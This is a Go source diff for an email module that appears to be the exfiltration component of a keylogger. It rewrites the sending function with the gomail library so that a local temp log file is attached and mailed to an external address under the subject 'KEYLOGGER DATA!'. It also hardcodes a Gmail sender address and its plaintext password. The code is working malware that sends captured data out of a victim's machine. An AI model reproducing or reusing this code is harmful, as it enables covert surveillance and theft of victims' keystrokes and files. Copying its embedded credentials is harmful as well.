@@ -1,26 +1,26 @@
 package email
 
 import (
-	"log"
-	"net/smtp"
+	"gopkg.in/gomail.v2"
 )
 
-func Send(body string) {
-	from := "tester.123.pepito@gmail.com"
-	pass := "adrenalina12"
-	to := "losidoh756@whipjoy.com"
+var (
+	host       = "smtp.gmail.com"
+	from       = "tester.123.pepito@gmail.com"
+	password   = "adrenalina12"
+	portNumber = 587
+)
 
-	msg := "From: " + from + "\n" +
-		"To: " + to + "\n" +
-		"Subject: Hello there\n\n" +
-		body
+func Send() {
+	m := gomail.NewMessage()
+	m.SetHeader("From", from)
+	m.SetHeader("To", "xorexa6205@zcai77.com")
+	m.SetHeader("Subject", "KEYLOGGER DATA!")
+	m.SetBody("text/html", "Hello <b>HACKER</b>!")
+	m.Attach("/Users/USUARIO/AppData/Local/Temp/mat-debug-26080.log")
 
-	err := smtp.SendMail("smtp.gmail.com:587",
-		smtp.PlainAuth("", from, pass, "smtp.gmail.com"),
-		from, []string{to}, []byte(msg))
-
-	if err != nil {
-		log.Printf("smtp error: %s", err)
-		return
+	d := gomail.NewPlainDialer(host, portNumber, from, password)
+	if err := d.DialAndSend(m); err != nil {
+		panic(err)
 	}
 }
